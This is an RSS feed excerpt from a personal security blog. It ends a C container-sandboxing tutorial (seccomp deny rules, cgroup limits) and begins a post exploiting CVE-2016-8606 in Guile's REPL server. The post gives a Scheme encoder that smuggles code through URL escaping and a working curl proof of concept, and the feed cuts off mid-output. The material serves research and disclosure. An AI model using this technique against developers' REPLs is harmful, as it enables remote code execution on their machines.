<label class="org-src-name"><span class="listing-number">Listing 42: </span><code>&lt;&lt;syscalls&gt;&gt;</code> +=</label><pre class="src src-C">|| seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(unshare), 1,
			SCMP_A0(SCMP_CMP_MASKED_EQ, CLONE_NEWUSER, CLONE_NEWUSER))
|| seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(clone), 1,
			SCMP_A0(SCMP_CMP_MASKED_EQ, CLONE_NEWUSER, CLONE_NEWUSER))
</pre>
</div>

<p>
<code>TIOCSTI</code> allows contained processes to write to the controlling
terminal.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 43: </span><code>&lt;&lt;syscalls&gt;&gt;</code> +=</label><pre class="src src-C">|| seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(ioctl), 1,
			SCMP_A1(SCMP_CMP_MASKED_EQ, TIOCSTI, TIOCSTI))
</pre>
</div>

<p>
The kernel keyring system isn't namespaced.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 44: </span><code>&lt;&lt;syscalls&gt;&gt;</code> +=</label><pre class="src src-C">|| seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(keyctl), 0)
|| seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(add_key), 0)
|| seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(request_key), 0)
</pre>
</div>

<p>
Before Linux 4.8, <code>ptrace</code> totally breaks seccomp.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 45: </span><code>&lt;&lt;syscalls&gt;&gt;</code> +=</label><pre class="src src-C">|| seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(ptrace), 0)
</pre>
</div>

<p>
These system calls let processes assign NUMA nodes. I don't have
anything specific in mind, but I could see these being used to deny
service to some other NUMA-aware application on the host.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 46: </span><code>&lt;&lt;syscalls&gt;&gt;</code> +=</label><pre class="src src-C">|| seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(mbind), 0)
|| seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(migrate_pages), 0)
|| seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(move_pages), 0)
|| seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(set_mempolicy), 0)
</pre>
</div>

<p>
<code>userfaultd</code> allows userspace to handle page
faults. It doesn't require any privileges, so in
theory it should be safe to be called by an unprivileged user. But it
can be used to pause execution in the kernel by triggering page faults
in system calls. This is an important part in some kernel
exploits. It's only rarely used legitimately, so
I'll disable it.
</p>


<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 47: </span><code>&lt;&lt;syscalls&gt;&gt;</code> +=</label><pre class="src src-C">|| seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(userfaultfd), 0)
</pre>
</div>

<p>
I was initially worried about <code>perf_event_open</code> because the <a href="https://github.com/docker/docker.github.io/blob/master/engine/security/seccomp.md">Docker
documentation says</a> it "could leak a lot of information on the host",
but it can't be used in our system to see information for
out-of-namespace processes. But, if
<code>/proc/sys/kernel/perf_event_paranoid</code> is less than 2, it can be used
to discover kernel addresses and possibly uninitialized memory. 2 is
the default since is the default since 4.6, but it can be changed, and
relying on it seems like a bad idea.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 48: </span><code>&lt;&lt;syscalls&gt;&gt;</code> +=</label><pre class="src src-C">|| seccomp_rule_add(ctx, SCMP_FAIL, SCMP_SYS(perf_event_open), 0)
</pre>
</div>

<p>
We'll set <code>PR_SET_NO_NEW_PRIVS</code> to 0. The name is a little vague: it
specifically prevents <code>setuid</code> and <code>setcap</code>'d binaries from being
executed with their additional privileges. This has some security
benefits (it makes it harder for an unprivileged user in-container to
exploit a vulnerability in a setuid or setcap executable to become
in-container root, for example). But it's a little weird, and means
that, for example, <code>ping</code> won't work in a container for an
unprivileged user.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 49: </span><code>&lt;&lt;syscalls&gt;&gt;</code> +=</label><pre class="src src-C">|| seccomp_attr_set(ctx, SCMP_FLTATR_CTL_NNP, 0)
</pre>
</div>

<p>
And we'll actually apply it to the process, and release the context.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 50: </span><code>&lt;&lt;syscalls&gt;&gt;</code> +=</label><pre class="src src-C">	    || seccomp_load(ctx)) {
		if (ctx) seccomp_release(ctx);
		fprintf(stderr, "failed: %m\n");
		return 1;
	}
	seccomp_release(ctx);
	fprintf(stderr, "done.\n");
	return 0;
}
</pre>
</div>
</div>
</li>
<li><a id="org79c1963"></a>Allowed System Calls<br />
<div class="outline-text-5" id="text-org79c1963">
<p>
Here are the system calls that are disallowed by the default Docker
policy but permitted by this code:
</p>

<p>
<code>_sysctl</code> is obsolete and disabled by
default. <code>alloc_hugepages</code> and
<code>free_hugepages</code> , <code>bdflush</code> ,
<code>create_module</code> , <code>nfsservctl</code> ,
<code>perfctr</code> , <code>get_kernel_syms</code> , and
<code>setup</code> are not present on modern Linux.
</p>

<p>
<code>clock_adjtime</code>, <code>clock_settime</code> , and
<code>adjtime</code> depend on <code>CAP_SYS_TIME</code>.
</p>

<p>
<code>pciconfig_read</code> and <code>pciconfig_write</code> and all of the
side-effecting operations of <code>quotactl</code> are prevented by
<code>CAP_SYS_ADMIN</code>.
</p>

<p>
<code>get_mempolicy</code> and <code>getpagesize</code> reveal information about the memory
layout of the system, but they can be made by unprivileged processes,
and are probably harmless. <code>pciconfig_iobase</code> can be made by
unprivileged processes, and reveals information about PCI decvices.
<code>ustat</code> and <code>sysfs</code> leak some information about
the filesystems, but are nothing that I see as critical. <code>uselib</code> is
more-or-less obsolete, but is just used for loading a shared library
in userspace 
</p>

<p>
<code>sync_file_range2</code> is <code>sync_file_range</code> with swapped argument
order.
</p>

<p>
<code>readdir</code> is mostly obsolete, but probably harmless.
</p>

<p>
<code>kexec_file_load</code> and <code>kexec_load</code> are prevented by
<code>CAP_SYS_BOOT</code> .
</p>

<p>
<code>nice</code> can only be used to lower priority without
<code>CAP_SYS_NICE</code> .
</p>

<p>
<code>oldfstat</code>, <code>oldlstat</code>, <code>oldolduname</code>, <code>oldstat</code>, and <code>olduname</code> are
just older versions of their respective functions. I expect them to
have the same security properties as the modern ones.
</p>

<p>
<code>perfmonctl</code> is only available on
IA-64. <code>ppc_rtas</code> , <code>spu_create</code> and
<code>spu_run</code> , and <code>subpage_prot</code> are only
avaiable on PowerPC. <code>utrap_install</code> is only available on
Sparc. <code>kern_features</code> is only available on
Sparc64, and should be harmless anyway.
</p>

<p>
I don't believe <code>pivot_root</code> is a problem in our setup (but it could
probably be used to circumvent path-based MAC).
</p>

<p>
<code>preadv2</code> and <code>pwritev2</code> are just extensions to <code>preadv</code> and <code>pwritev</code>
/ <code>readv</code> and <code>writev</code>, which are "scatter input" / "gather output"
extensions to <code>read</code> and <code>write</code> .
</p>
</div>
</li>
</ul>
</div>
<div id="outline-container-orgf4659c1" class="outline-4">
<h4 id="orgf4659c1">Resources</h4>
<div class="outline-text-4" id="text-orgf4659c1">
<p>
We'd like to prevent badly-behaved child processes from denying
service to the rest of the system. Cgroups let
us limit memory and cpu time in particular; limiting the pid count and
IO usage is also useful. <a href="https://www.kernel.org/doc/Documentation/cgroup-v1/cgroups.txt">There's a very useful document in the kernel
tree about it</a>.
</p>

<p>
The <code>cgroup</code> and <code>cgroup2</code> filesystems are the canonical interfaces to
the cgroup system.  <code>cgroup2</code> is a little different, and unitialized
on my system, so I'll use the first version here.
</p>

<p>
Cgroup namespaces are a little different from, for example, mount
namespaces. We need to create the cgroup before we enter a cgroup
namespace; once we do, that cgroup will behave like the root cgroup
inside of the namespace. This isn't the most
relevant, since a contained process can't mount the cgroup filesystem
or <code>/proc</code> for introspection, but it's nice to be thorough.
</p>

<p>
I'll set up a struct so I don't have to repeat myself too much, with
the following instructions:
</p>

<ul class="org-ul">
<li>Set <code>memory/$hostname/memory.limit_in_bytes</code>, so the contained
process and its child processes can't total more than 1GB memory in
userspace.</li>
<li>Set <code>memory/$hostname/memory.kmem.limit_in_bytes</code>, so that the
contained process and its child processes can't total more than 1GB
memory in userspace.</li>
<li>Set <code>cpu/$hostname/cpu.shares</code> to 256. CPU shares are chunks of
1024; 256 * 4 = 1024, so this lets the contained process take a
quarter of cpu-time on a busy system at most.</li>
<li>Set the <code>pids/$hostname/pid.max</code>, allowing the contained process and
its children to have 64 pids at most. This is useful because there
are per-user pid limits that we could hit on the host if the
contained process occupies too many.</li>
<li>Set <code>blkio/$hostname/weight</code> to 50, so that it's lower than the rest
of the system and prioritized accordingly.</li>
</ul>

<p>
I'll also add the calling process for each of
<code>{memory,cpu,blkio,pids}/$hostname/tasks</code> by writing '0' to it.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 51: </span><code>&lt;&lt;resources&gt;&gt;</code> +=</label><pre class="src src-C">#define MEMORY "1073741824"
#define SHARES "256"
#define PIDS "64"
#define WEIGHT "10"
#define FD_COUNT 64

struct cgrp_control {
	char control[256];
	struct cgrp_setting {
		char name[256];
		char value[256];
	} **settings;
};
struct cgrp_setting add_to_tasks = {
	.name = "tasks",
	.value = "0"
};

struct cgrp_control *cgrps[] = {
	&amp; (struct cgrp_control) {
		.control = "memory",
		.settings = (struct cgrp_setting *[]) {
			&amp; (struct cgrp_setting) {
				.name = "memory.limit_in_bytes",
				.value = MEMORY
			},
			&amp; (struct cgrp_setting) {
				.name = "memory.kmem.limit_in_bytes",
				.value = MEMORY
			},
			&amp;add_to_tasks,
			NULL
		}
	},
	&amp; (struct cgrp_control) {
		.control = "cpu",
		.settings = (struct cgrp_setting *[]) {
			&amp; (struct cgrp_setting) {
				.name = "cpu.shares",
				.value = SHARES
			},
			&amp;add_to_tasks,
			NULL
		}
	},
	&amp; (struct cgrp_control) {
		.control = "pids",
		.settings = (struct cgrp_setting *[]) {
			&amp; (struct cgrp_setting) {
				.name = "pids.max",
				.value = PIDS
			},
			&amp;add_to_tasks,
			NULL
		}
	},
	&amp; (struct cgrp_control) {
		.control = "blkio",
		.settings = (struct cgrp_setting *[]) {
			&amp; (struct cgrp_setting) {
				.name = "blkio.weight",
				.value = PIDS
			},
			&amp;add_to_tasks,
			NULL
		}
	},
	NULL
};
</pre>
</div>


<p>
Writing to the cgroups version 1 filesystem works like
this:
</p>
<ul class="org-ul">
<li>In each controller, you can create a cgroup with a name with
<code>mkdir</code>. For memory, <code>mkdir /sys/fs/cgroup/memory/$hostname</code>.</li>
<li>Inside of that you can write to the individual files to set
values. For example, <code>echo $MEMORY &gt;
  /sys/fs/cgroup/memory/$hostname/memory.limit_in_bytes</code>.</li>
<li>You can a pid to <code>tasks</code> to add the process tree to the cgroup. "0"
is a special value that means "the writing process".</li>
</ul>

<p>
so I'll iterate over that structure and fill in the values.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 52: </span><code>&lt;&lt;resources&gt;&gt;</code> +=</label><pre class="src src-C">int resources(struct child_config *config)
{
	fprintf(stderr, "=&gt; setting cgroups...");
	for (struct cgrp_control **cgrp = cgrps; *cgrp; cgrp++) {
		char dir[PATH_MAX] = {0};
		fprintf(stderr, "%s...", (*cgrp)-&gt;control);
		if (snprintf(dir, sizeof(dir), "/sys/fs/cgroup/%s/%s",
			     (*cgrp)-&gt;control, config-&gt;hostname) == -1) {
			return -1;
		}
		if (mkdir(dir, S_IRUSR | S_IWUSR | S_IXUSR)) {
			fprintf(stderr, "mkdir %s failed: %m\n", dir);
			return -1;
		}
		for (struct cgrp_setting **setting = (*cgrp)-&gt;settings; *setting; setting++) {
			char path[PATH_MAX] = {0};
			int fd = 0;
			if (snprintf(path, sizeof(path), "%s/%s", dir,
				     (*setting)-&gt;name) == -1) {
				fprintf(stderr, "snprintf failed: %m\n");
				return -1;
			}
			if ((fd = open(path, O_WRONLY)) == -1) {
				fprintf(stderr, "opening %s failed: %m\n", path);
				return -1;
			}
			if (write(fd, (*setting)-&gt;value, strlen((*setting)-&gt;value)) == -1) {
				fprintf(stderr, "writing to %s failed: %m\n", path);
				close(fd);
				return -1;
			}
			close(fd);
		}
	}
	fprintf(stderr, "done.\n");
</pre>
</div>

<p>
I'll also lower the hard limit on the number of file descriptors. The
file descriptor number, like the number of pids, is per-user, and so
we want to prevent in-container process from occupying all of
them. Setting the hard limit sets a permanent upper bound for this
process tree, since I've dropped
<code>CAP_SYS_RESOURCE</code> .
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 53: </span><code>&lt;&lt;resources&gt;&gt;</code> +=</label><pre class="src src-C">	fprintf(stderr, "=&gt; setting rlimit...");
	if (setrlimit(RLIMIT_NOFILE,
		      &amp; (struct rlimit) {
			.rlim_max = FD_COUNT,
			.rlim_cur = FD_COUNT,
		})) {
		fprintf(stderr, "failed: %m\n");
		return 1;
	}
	fprintf(stderr, "done.\n");
	return 0;
}
</pre>
</div>


<p>
We'd also like to clean up the cgroup for this hostname. There's
built-in functionality for this, but we would need to change
system-wide values to do it cleanly. Since we
have the <code>contained</code> process waiting on the contained process, it's
simple to do it this way. First we move the <code>contained</code> process back
into the root <code>tasks</code>; then, since the child process is finished, and
leaving the pid namespace <code>SIGKILLS</code> its children, the <code>tasks</code> is
empty. We can safely <code>rmdir</code> at this point.
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 54: </span><code>&lt;&lt;resources&gt;&gt;</code> +=</label><pre class="src src-C">
int free_resources(struct child_config *config)
{
	fprintf(stderr, "=&gt; cleaning cgroups...");
	for (struct cgrp_control **cgrp = cgrps; *cgrp; cgrp++) {
		char dir[PATH_MAX] = {0};
		char task[PATH_MAX] = {0};
		int task_fd = 0;
		if (snprintf(dir, sizeof(dir), "/sys/fs/cgroup/%s/%s",
			     (*cgrp)-&gt;control, config-&gt;hostname) == -1
		    || snprintf(task, sizeof(task), "/sys/fs/cgroup/%s/tasks",
				(*cgrp)-&gt;control) == -1) {
			fprintf(stderr, "snprintf failed: %m\n");
			return -1;
		}
		if ((task_fd = open(task, O_WRONLY)) == -1) {
			fprintf(stderr, "opening %s failed: %m\n", task);
			return -1;
		}
		if (write(task_fd, "0", 2) == -1) {
			fprintf(stderr, "writing to %s failed: %m\n", task);
			close(task_fd);
			return -1;
		}
		close(task_fd);
		if (rmdir(dir)) {
			fprintf(stderr, "rmdir %s failed: %m", dir);
			return -1;
		}
	}
	fprintf(stderr, "done.\n");
	return 0;
}
</pre>
</div>
</div>
</div>
<div id="outline-container-org93f25ac" class="outline-4">
<h4 id="org93f25ac">Networking</h4>
<div class="outline-text-4" id="text-org93f25ac">
<p>
Container networking takes a little too much explanation for this
space. It usually works like this:
</p>

<ul class="org-ul">
<li>Create a bridge device.</li>
<li>Create a virtual ethernet pair and attach one end to the bridge.</li>
<li>Put the other end in the network namespace.</li>
<li>For outside networking access, the host needs to be set to forward
(and possibly NAT) packets.</li>
</ul>

<p>
Having multiple contained processes sharing a bridge device would mean
they're both on the same LAN from the host's perspective. So ARP
spoofing is a recurring issue with containers that work this
way.
</p>

<p>
The canonical way to do this from C is the <code>rtnetlink</code> interface; it
would probably be easier to use <code>ip link ...</code>.
</p>


<p>
We could also limit the network usage with the <code>net_prio</code> cgroup
controller.
</p>
</div>
</div>
</div>
]]></description>
</item>
<item>
<title>Exploiting CVE-2016-8606: a cross-protocol attack from browsers to Guile Scheme repls!</title>
<link>https://blog.lizzie.io/exploiting-CVE-2016-8606.html</link>
<author>_@lizzie.io (Lizzie Dixon)</author>
<guid isPermaLink="false">https://blog.lizzie.io/exploiting-CVE-2016-8606.html</guid>
<pubDate>Sat, 15 Oct 2016 13:11:00 -0700</pubDate>

<description><![CDATA[<p>
I saw this recently:
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 55: </span><a href="http://www.openwall.com/lists/oss-security/2016/10/11/9"><code>CVE request: GNU Guile &lt;= 2.0.12: REPL server</code></a></label><pre class="src src-text">GNU Guile, an implementation of the Scheme language, provides a “REPL
server” which is a command prompt that developers can connect to for
live coding and debugging purposes.  The REPL server is started by the
‘--listen’ command-line option or equivalent API.

Christopher Allan Webber reported that the REPL server is vulnerable to
the HTTP inter-protocol attack as described at
&lt;https://en.wikipedia.org/wiki/Inter-protocol_exploitation&gt;, notably the
HTML form protocol attack described at
&lt;https://www.jochentopf.com/hfpa/hfpa.pdf&gt;.

This constitutes a remote code execution vulnerability for developers
running a REPL server that listens on a loopback device or private
network.  Applications that do not run a REPL server, as is usually the
case, are unaffected.

Developers can work around this vulnerability by binding the REPL server
to a Unix-domain socket, for instance by running:

  guile --listen=/some/file

A modification to the REPL server that detects attempts to exploit this
vulnerability is available upstream and will be part of Guile 2.0.13, to
be released shortly.
</pre>
</div>

<p>
A cross-protocol attack from browsers to Guile Scheme repls! Exciting.
</p>

<p>
But I've seen a lot of misinformation about this. For example,
</p>

<div class="org-src-container">
<label class="org-src-name"><span class="listing-number">Listing 56: </span><a href="https://lists.gnu.org/archive/html/guile-user/2016-10/msg00007.html"><code>Guile security vulnerability w/ listening on localhost + port (with fix)</code></a></label><pre class="src src-text">The default in Guile has been to expose a port over localhost to which
code may be passed.  The assumption for this is that only a local user
may write to localhost, so it should be safe.  Unfortunately, users
simultaneously developing Guile and operating modern browsers are
vulnerable to a combination of an html form protocol attack [1] and a
DNS rebinding attack [2].  How to combine these attacks is published in
the article "How to steal any developer's local database" [3].

In Guile's case, the general idea is that you visit some site which
presumably loads some javascript code (or tricks the developer into
pressing a button which performs a POST), and the site operator switches
the DNS from their own IP to 127.0.0.1.  Then a POST is done from the
website to 127.0.0.1 with the body containing scheme code.  This code is
then executed by the Guile interpreter on the listening port.
</pre>
</div>

<p>
I'll demonstrate that this does not require DNS rebinding to work. We
can just use <code>XMLHttpRequest</code>.
</p>

<p>
Normally CORS checks happen for <code>XMLHttpRequest</code>. Browsers will make a
request and check if the response indicates, with
<code>Acess-Control-Allow-Origin</code>, that the Javascript context can read it.
That request includes our data! We can just pack some Guile code into
the URL of a GET, and Guile will ignore everything it doesn't understand.
</p>

<p>
There's a hurdle, though: metacharacters in urls will be
percent-escaped. Since Guile doesn't speak URL, we'll have to work
around this. In particular, we need
</p>
<ul class="org-ul">
<li>no double-quotes  (i.e.. string literals)</li>
<li>no backslashes or <code>#</code> (i.e., no char literals)</li>
<li>no whitespace</li>
</ul>

<p>
(additionally, some symbols will be escaped. for example,
<code>integer-&gt;char</code> will have its <code>&gt;</code> escaped. We can just avoid these.)
</p>

<p>
So, we need to transform code to fit these rules. Naturally, I'll
write the transformations in Guile.
</p>
<div id="outline-container-org27c6b6f" class="outline-3">
<h3 id="org27c6b6f">String literals</h3>
<div class="outline-text-3" id="text-org27c6b6f">
<p>
We'll walk the tree and replace the string literal <code>abcd</code> with <code>(string #\a #\b #\c)</code>:
</p>


<div class="org-src-container">
<pre class="src src-scheme">(define (charify form)
  (cond
   [(list? form) (map charify form)]
   [(string? form) `(string ,@(string-&gt;list form))]
   [else form]))
</pre>
</div>

<pre class="example" id="org3e10f72">
scheme@(guile-user)&gt; (charify '(string-join (list "abc" "def")))
$3 = (string-join (list (string #\a #\b #\c) (string #\d #\e #\f)))
</pre>
</div>
</div>
<div id="outline-container-org89c62d2" class="outline-3">
<h3 id="org89c62d2">Char literals</h3>
<div class="outline-text-3" id="text-org89c62d2">
<p>
But the number sign in <code>#\a</code> is url-escaped as well. so we'll bind a
list of the characters in ASCII, and replace each letter with an
indexing into it:
</p>

<p>
We'll replace
</p>

<pre class="example">
(list #\a #\b)
</pre>


<p>
with the equivalent of
</p>

<pre class="example" id="org2fd0f79">
(let ((ascii "..."))
  (list
	(list-ref ascii 97)
	(list-ref ascii 98)))
</pre>

<p>
Ordinarily, we could just use <code>integer-&gt;char</code>, but <code>&gt;</code> will be percent-escaped.
</p>

<div class="org-src-container">
<pre class="src src-scheme">(define (asciify form)
  (letrec ([inner-asciify
		(lambda (form)
		  (cond
		   [(list? form) (map inner-asciify form)]
		   [(char? form) `(list-ref ascii ,(char-&gt;integer form))]
		   [else form]))])
	`(let ([ascii (reverse (char-set-fold cons (make-list 0) char-set:ascii))])
	   ,(inner-asciify form))))
</pre>
</div>
</div>
</div>
<div id="outline-container-orge1babe4" class="outline-3">
<h3 id="orge1babe4">Spaces</h3>
<div class="outline-text-3" id="text-orge1babe4">
<p>
Finally, we can't have spaces. This is tricky, since we can't just
remove the spaces, because for example <code>(+ 1 2)</code> would become
<code>(+12)</code>. But because there's no need for a space before and after
parens, we can use the identity function, replacing
</p>

<pre class="example">
(+ 1 2)
</pre>


<p>
with
</p>

<pre class="example">
(+ ((lambda (x) x) 1) ((lambda (x) x) 2))
</pre>


<p>
and then the spaces can be removed.
</p>


<div class="org-src-container">
<pre class="src src-scheme">(use-modules (srfi srfi-1))

(define (lambdify form)
  (cond
   [(list? form)
	(cond
	 ;; don't lambdify let or letrec, but lambdify the bindings. ....
	 [(member (first form) '(let letrec let*))
	  `(,(first form)
	    ,(map
	      (lambda (binding)
		`[,(first binding)
		  ,(lambdify (second binding))])
	      (second form))
	    ,@(map lambdify (drop form 2)))]
	 ;; only lambdify the bodies of lambdas
	 [(eq? (first form) 'lambda)
	  `(lambda
	       ,(second form)
	     ,@(map lambdify (drop form 2)))]
	 ;; error on quote, it's tricky to lambdify it.
	 [(eq? (first form) 'quote)
	  (throw 'lambidfy-quote)]
	 ;; otherwise just lambdify everything
	 [else  (map lambdify form)])]
   ;; everything else gets replaced with ((lambda(x)x)y)
   [else `((lambda (x) x) ,form)]))
</pre>
</div>

<pre class="example" id="org0271bc0">
scheme@(guile-user)&gt; (lambdify '(+ 1 2))
$11 = (((lambda (x) x) +) ((lambda (x) x) 1) ((lambda (x) x) 2))
scheme@(guile-user)&gt; (lambdify '(let ((a 1)) a))
$12 = (let ((a ((lambda (x) x) 1))) ((lambda (x) x) a))

</pre>
</div>
</div>
<div id="outline-container-orga82c48e" class="outline-3">
<h3 id="orga82c48e">Trying it out</h3>
<div class="outline-text-3" id="text-orga82c48e">
<pre class="example" id="orgf2d84ff">
scheme@(guile-user)&gt; (lambdify (asciify (charify '(string-join (list "abc" "def")))))
$15 = (let ((ascii (((lambda (x) x) reverse) (((lambda (x) x) char-set-fold) ((lambda (x) x) cons) (((lambda (x) x) make-list) ((lambda (x) x) 0)) ((lambda (x) x) char-set:ascii))))) (((lambda (x) x) string-join) (((lambda (x) x) list) (((lambda (x) x) string) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 97)) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 98)) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 99))) (((lambda (x) x) string) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 100)) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 101)) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 102))))))
scheme@(guile-user)&gt; (let ((ascii (((lambda (x) x) reverse) (((lambda (x) x) char-set-fold) ((lambda (x) x) cons) (((lambda (x) x) make-list) ((lambda (x) x) 0)) ((lambda (x) x) char-set:ascii))))) (((lambda (x) x) string-join) (((lambda (x) x) list) (((lambda (x) x) string) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 97)) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 98)) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 99))) (((lambda (x) x) string) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 100)) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 101)) (((lambda (x) x) list-ref) ((lambda (x) x) ascii) ((lambda (x) x) 102))))))
$16 = "abc def"
</pre>

<p>
and putting it all together:
</p>

<div class="org-src-container">
<pre class="src src-scheme">(define (elide-spaces string)
  (string-filter
   (lambda (char) (not (eq? char #\ )))
   string))


(define (escape form)
  (elide-spaces
   (with-output-to-string
	 (lambda ()
	   (write
	    (lambdify (asciify (charify form))))))))
</pre>
</div>


<pre class="example" id="org6a6009d">
scheme@(guile-user)&gt; (escape '(string-join (list  "abc" "def")))
$7 = "(let((ascii(((lambda(x)x)reverse)(((lambda(x)x)char-set-fold)((lambda(x)x)cons)(((lambda(x)x)make-list)((lambda(x)x)0))((lambda(x)x)char-set:ascii)))))(((lambda(x)x)string-join)(((lambda(x)x)list)(((lambda(x)x)string)(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)97))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)98))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)99)))(((lambda(x)x)string)(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)100))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)101))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)102))))))"
scheme@(guile-user)&gt; (let((ascii(((lambda(x)x)reverse)(((lambda(x)x)char-set-fold)((lambda(x)x)cons)(((lambda(x)x)make-list)((lambda(x)x)0))((lambda(x)x)char-set:ascii)))))(((lambda(x)x)string-join)(((lambda(x)x)list)(((lambda(x)x)string)(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)97))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)98))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)99)))(((lambda(x)x)string)(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)100))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)101))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)102))))))
$8 = "abc def"
</pre>


<p>
I started a Guile repl and tried this with <code>curl</code>:
</p>

<pre class="example" id="orga3e59f5">
[lizzie@empress lizzie]$ guile --listen=37146
GNU Guile 2.0.12
Copyright (C) 1995-2016 Free Software Foundation, Inc.

Guile comes with ABSOLUTELY NO WARRANTY; for details type `,show w'.
This program is free software, and you are welcome to redistribute it
under certain conditions; type `,show c' for details.

Enter `,help' for help.
scheme@(guile-user)&gt;
</pre>

<pre class="example" id="org0d324f7">
[lizzie@empress lizzie]$ curl "localhost:37146?=(let((ascii(((lambda(x)x)reverse)(((lambda(x)x)char-set-fold)((lambda(x)x)cons)(((lambda(x)x)make-list)((lambda(x)x)0))((lambda(x)x)char-set:ascii)))))(((lambda(x)x)string-join)(((lambda(x)x)list)(((lambda(x)x)string)(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)97))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)98))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)99)))(((lambda(x)x)string)(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)100))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)101))(((lambda(x)x)list-ref)((lambda(x)x)ascii)((lambda(x)x)102))))))"
GNU Guile 2.0.12
Copyright (C) 1995-2016 Free Software Foundation, Inc.

Guile comes with ABSOLUTELY NO WARRANTY; for details type `,show w'.
This program is free software, and you are welcome to redistribute it
under certain conditions; type `,show c' for details.

Enter `,help' for help.
;;; &lt;unknown-location&gt;: warning: possibly unbound variable `GET'
ERROR: In procedure #&lt;procedure 2253c40 ()&gt;:
ERROR: In procedure module-lookup: Unbound variable: GET

Entering a new prompt.  Type `,bt' for a backtrace or `,q' to continue.
;;; &lt;unknown-location&gt;: warning: possibly unbound variable `/?='
ERROR: In procedure #&lt;procedure 1cbfd40 ()&gt;:
ERROR: In procedure module-lookup: Unbound variable: /?=

Entering a new prompt.  Type `,bt' for a backtrace or `,q' to continue.
$54 = "abc def"
;;; &lt;unknown-location&gt;: warning: possibly unbound variable `HTTP/1.1'
ERROR: In procedure #&lt;procedure 19ceba0 ()&gt;:
ERROR: In procedure module-lookup: Unbound variable: HTTP/1.1

Entering a new prompt.  Type `,bt' for a backtrace or `,q' to continue.
;;; &lt;unknown-location&gt;: warning: possibly unbound variable `Host:'
ERROR: In procedure #&lt;procedure 162c1e0 ()&gt;:
ERROR: In procedure module-lookup: Unbound variable: Host:

Entering a new prompt.  Type `,bt' for a backtrace or `,q' to continue.
;;; &lt;unknown-location&gt;: warning: possibly unbound variable `localhost:37146'
ERROR: In procedure #&lt;procedure 165e720 ()&gt;:
ERROR: In procedure module-lookup: Unbound variable: localhost:37146

Entering a new prompt.  Type `,bt' for a backtrace or `,q' to continue.
;;; &lt;unknown-location&gt;: warning: possibly unbound variable `User-Agent:'
ERROR: In procedure #&lt;procedure 16e2c20 ()&gt;:
ERROR: In procedure module-lookup: Unbound variable: User-Agent:

Entering a new prompt.  Type `,bt' for a backtrace or `,q' to continue.
;;; &lt;unknown-location&gt;: warning: possibly unbound variable `curl/7.50.3'
ERROR: In procedure #&lt;procedure 1769f20 ()&gt;:
ERROR: In procedure module-lookup: Unbound variable: curl/7.50.3

Entering a new prompt.  Type `,bt' for a backtrace or `,q' to continue.
;;; &lt;unknown-location&gt;: warning: possibly unbound variable `Accept:'
ERROR: In procedure #&lt;procedure 17c3b20 ()&gt;:
ERROR: In procedure module-lookup: Unbound variable: Accept:

Entering a new prompt.  Type `,bt' for a backtrace or `,q' to continue.
;;; &lt;unknown-location&gt;: warning: possibly unbound variable `*/*'
ERROR: In procedure #&lt;procedure 17ef5e0 ()&gt;:
